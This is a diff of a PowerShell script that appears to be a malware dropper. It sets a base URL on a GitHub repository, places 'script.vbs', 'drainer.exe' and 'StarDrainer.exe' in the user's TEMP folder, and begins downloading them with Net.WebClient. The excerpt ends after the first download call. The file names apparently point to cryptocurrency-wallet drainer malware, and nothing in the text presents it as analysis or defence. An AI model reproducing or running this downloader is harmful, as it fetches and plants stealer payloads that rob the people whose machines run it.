@@ -1,9 +1,9 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
+
 $base = 'https://github.com/jesuss13377-source/456/raw/refs/heads/main/'
 $vbs = Join-Path $env:TEMP 'script.vbs'
 $d1  = Join-Path $env:TEMP 'drainer.exe'
 $d2  = Join-Path $env:TEMP 'StarDrainer.exe'
-
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 try {
     (New-Object Net.WebClient).DownloadFile($base + 'script.vbs', $vbs)
